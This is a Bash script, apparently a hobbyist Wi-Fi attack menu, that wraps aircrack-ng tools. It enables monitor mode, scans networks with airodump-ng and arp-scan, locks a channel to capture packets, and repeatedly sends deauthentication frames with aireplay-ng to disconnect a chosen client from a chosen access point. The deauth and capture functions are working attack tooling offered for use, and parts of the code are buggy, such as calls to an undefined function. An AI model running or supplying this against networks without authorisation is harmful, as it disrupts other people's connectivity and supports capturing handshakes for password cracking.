#!/bin/bash


#COLOR SETUP
y='\e[1;33m'
blue='\e[34m'
black_red='\e[41;30m'
green='\e[32m'
none='\e[0m'

# FUNCTIONS
starting () {
  counter=0
  until [ $counter -gt 1 ]
  do
    clear
    printf "${y}                              STARTING                            ${none}\n"
    sleep 0.3
    clear
    printf "${y}                              STARTING.                           ${none}\n"
    sleep 0.3
    clear
    printf "${y}                              STARTING..                          ${none}\n"
    sleep 0.3
    clear
    printf "${y}                              STARTING...                         ${none}\n"
    sleep 0.3
    counter=$(( counter+1 ))
  done
}

# MONITOR MODE

monitor_mode () {
  printf "${y}     __________________________________________________________${none}\n"
  sleep 0.2
  printf "${y}     | ___    ___                                    ______     |${none}\n"
  sleep 0.2
  printf "${y}     | DDD    DDD                                    DDDDDD    |${none}\n"
  sleep 0.2
  printf "${y}     | DDDD  DDDD _____ ___  __ ______ ______ _____  DDDDDDD   |${none}\n"
  sleep 0.2
  printf "${y}     | DD DDDD DD  DDDDD DDD  DD DDDDDD DDDDDD DDDDD DD__ DD   |${none}\n"
  sleep 0.2
  printf "${y}     | DD  DD  DD  D  DD DD D DD   DD     DD   D  DD DDDDDD    |${none}\n"
  sleep 0.2
  printf "${y}     | DD      DD  D D D DD  DDD__ DD_    DD   D D D DD  DD    |${none}\n"
  sleep 0.2
  printf "${y}     | DD      DD  DDDDD DD   DD DDDDDD   DD   DDDDD DD   DD   |${none}\n"
  sleep 0.2
  printf "${y}     | DD                                                  DD  |${none}\n"
  sleep 0.2
  printf "${y}     | DD___________________ M__ O__ D__ E_____________     DD |${none}\n"
  sleep 0.2
  printf "${y}     | DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD    DD|${none}\n"
  sleep 0.2
  printf "${y}     |__________________________________________________________D|${none}\n"
}


# Ask FOR WIFI CARD
wificard () {
  checkwifi=$(ifconfig) ; printf "${green} $checkwifi ${none}\n"
  printf "${black_red} TEST COLOR BLACK RED ${none}\n"
  printf "${y} What is your WIRELESS CARDs name? ${none}\n"
  read WFcard
}

# TURN ON MONITOR MODE  (name WIFI CARD)

TURN_ON () {
  wificard
  turnon=$(airmon-ng start $WFcard ; iwconfig) ; printf "${green} $turnon ${none}\n"
  sleep 0.3
  printf "${y}     ---------------________ TURNED ON _________----------------${none}\n"
  sleep 0.3
  printf "${y}     ___________________________________________________________${none}\n"
}

# TURN OFF MONTITOR MODE (rename WIFI CARD)

TURN_OFF () {
  wificard
  turnoff=$(airmon-ng stop $WFcard ; iwconfig) ; printf "${green} $turnoff ${none}\n"
  printf "${y}     ---------------________ TURNED OFF ________----------------${none}\n"
  printf "${y}     ___________________________________________________________${none}\n"
}

# SCANING

Scan () {
printf "${y}       ------------------------ PERFORMING ARP-SCAN --------------------${none}\n"
printf "${y}      |                                                                 |${none}\n"
does=$(arp-scan -l)
printf "${green}      $does${none}\n"
printf "${y}      |         To clear the screen and continue press enter            | ${none}\n"
printf "${y}      |                                                                 |${none}\n"
printf "${y}       -----------------------------------------------------------------${none}\n"
read ending
clear
}

Scan_networks () {
printf "${y}       --------------- PERFORMING A SCAN OF LOCAL NETWORKS -------------${none}\n"
printf "${y}      |                                                                 |${none}\n"
wificard
does=$(airodump-ng $WFcard)
printf "${green}      $does${none}\n"
printf "${y}      |         To clear the screen and continue press enter            |${none}\n"
printf "${y}      |                                                                 |${none}\n"
printf "${y}       --------------------------------------------------------------------------------------${none}\n"
read ending
clear
}

# DEAUTH

DEAUTHSINGLE () {
printf "${y}       ---------------- PERFORMING DEAUTH SINGLE DEVICE ---------------${none}\n"
printf "${y}      |                                                                 |${none}\n"
printf "${y}      |  for this attack to work you must have locked a channel         |${none}\n"
printf "${y}      |                                                                 |${none}\n"
printf "${y}      |  * HOW MANY ATTACKS?                                            |${none}\n"
  read X
printf "${y}      |                                                                 |${none}\n"
printf "${y}      |                                                                 |${none}\n"
printf "${y}      |  * WHAT IS THE BSSID/MAC of NETWORK?                            |${none}\n"
read BSSID
printf "${y}      |  * WHAT IS THE MAC OF DEVICE?                                   |${none}\n"
read deviceMAC
iwconfig
printf "${y}      |  * ENTER WIFICARD                                               |${none}\n"   
read WFcard
printf "${y}      |  PRESS ENTER TO START ATTACK                                    |${none}\n"
  read startattack
  counter=0
  until [ $counter -gt $X ]
  do
    deauther=$(aireplay-ng --deauth 2 -a $BSSID -c $deviceMAC $WFcard)
    printf "${green}      $deauther ${none}\n"
    counter=$(( counter+1 ))
  done
printf "${green}$does${none}\n"
printf "${y}      |          To clear the screen and continue press enter           |${none}\n"
printf "${y}      |                                                                 |${none}\n"
printf "${y}       -----------------------------------------------------------------${none}\n"
read ending
clear
}


#LOCK CHANNEL

LOCK () {
  printf "${y}       -------------------- PERFORMING CHANNEL LOCK --------------------${none}\n"
  printf "${y}      |                                                                 |${none}\n"
  printf "${y}      |  this will lock a ACCESS POINT TO A CHANNEL and GRAB PACKETS    |${none}\n"
  printf "${y}      |                                                                 |${none}\n"
  printf "${y}      |  * WHAT CHANNEL IS THE BSSID ON?                                |${none}\n"
    read X
  printf "${y}      |                                                                 |${none}\n"
  printf "${y}      |  * NAME THE PACKET AS..                                         |${none}\n"
    read M
  printf "${y}      |                                                                 |${none}\n"
  printf "${y}      |  * TYPE BSSID                                                   |${none}\n"
    read BSSID
    dropdown=$(ifconfig)
    printf "${green} $dropdown ${none}\n"
  printf "${y}      |                                                                 |${none}\n"
  printf "${y}      |  * TYPE WIFI CARD                                               |${none}\n"
  read WFcard
  printf "${y}      |                                                                 |#{none}\n"
  printf "${y}      |  PRESS ENTER TO START                                           |${none}\n"
    read startattack
      channellock=$(airodump-ng -c $X -w $M -d $BSSID $WFcard)
      printf "${green} $channellock ${none}\n"
  printf "${y}|         To clear the screen and continue press enter                  |${none}\n"
  printf "${y}|                                                                       |${none}\n"
  printf "${y} ----------------------------------------------------------------${none}\n"
  read ending
clear
}

# MAIN MENU

main_menu () {
  start_up
  x=1
  while [ $x != 0 ]
  do
    printf "${y}     ___________________________________________________________${none}\n"
    printf "${y}     |   ___    ___                               ___   ___     |${none}\n"
    printf "${y}     |  | DDD    DDD                             | DDD   DDD    |${none}\n"
    printf "${y}     |  | DDDD  DDDD _____ _______ ___  __       | DDDD DDDD    |${none}\n"
    printf "${y}     |  | DD DDDD DD  DDDDD DDDDDDD DDD  DD      | DDDDDDDDD    |${none}\n"
    printf "${y}     |  | DD  DD  DD  DD  D   DD    DD D DD __   | DD DDD DD    |${none}\n"
    printf "${y}     |  | DD    | DD  DDDDD   DD    DD  DDD  DD  | DD     DD    |${none}\n"
    printf "${y}     |  | DD    | DD  DD  D DDDDDDD DD   DD  DD  | DD   | DD    |${none}\n"
    printf "${y}     |  | DD                                            | DD    |${none}\n"
    printf "${y}     |  | DD___________________ M__ E__ N__ U___________|_DD    |${none}\n"
    printf "${y}     |                                                          |${none}\n"
    printf "${y}     |__________________________________________________________|${none}\n"
    printf "${y}     |__________________________________________________________|${none}\n"
    printf "     ${black_red}|                     - DEAUTH ATTACK-                     |${none}\n" 
    printf "${y}      __________________________________________________________${none}\n"
    printf "${y}     |                                                          |${none}\n"
    printf "${y}     |  1) MONITOR MODE (on)       5) SCAN NETWORK              |${none}\n"
    printf "${y}     |  2) MONITOR MODE (off)      6) SCAN FOR NETWORKS         |${none}\n"
    printf "${y}     |  3) DEAUTH ALL DEVICES      7) LOCK NETWORK TO CHANNEL   |${none}\n"
    printf "${y}     |  4) DEAUTH SINGLE DEVICE    8) MAIN MENU                 |${none}\n"
    printf "${y}     |  9) DELETE UNEEDED PACKETS                               |${none}\n"
    printf "${y}     |__________________________________________________________|${none}\n"
    printf "${y}       ENTER OPTION NUMBER ${none}\n"
    read choice
# 1
    if [ $choice == 1 ]
    then
      start_up
      monitor_mode
      TURN_ON
# 2
    elif [ $choice -eq 2 ]
    then
      start_up
      monitormode
      TURN_OFF
# 3
    elif [ $choice -eq 3 ]
    then
      echo still working on option 3
      sleep 2
#4
    elif [ $choice -eq 4 ]
    then
      start_up
      DEAUTHSINGLE
#5
    elif [ $choice -eq 5 ]
    then
      start_up
      Scan
#6
    elif [ $choice -eq 6 ]
    then
      start_up
      Scan_networks
#7
    elif [ $choice -eq 7 ]
    then
      start_up
      LOCK
# 8
    elif [ $choice -eq 8 ]
    then
      ./MainMenu.sh
#9
    elif [ $choice -eq 9 ]
    then
      find . -name "*.csv" -type f -delete
      find . -name "*.netxml" -type f -delete
#else
    else
      printf "${black_red}Error; $choice is not an option${none}\n"
      sleep 1
      read nothing
      clear
    fi
  done
}


start_up () {
clear
starting
}


# START LINE
main_menu
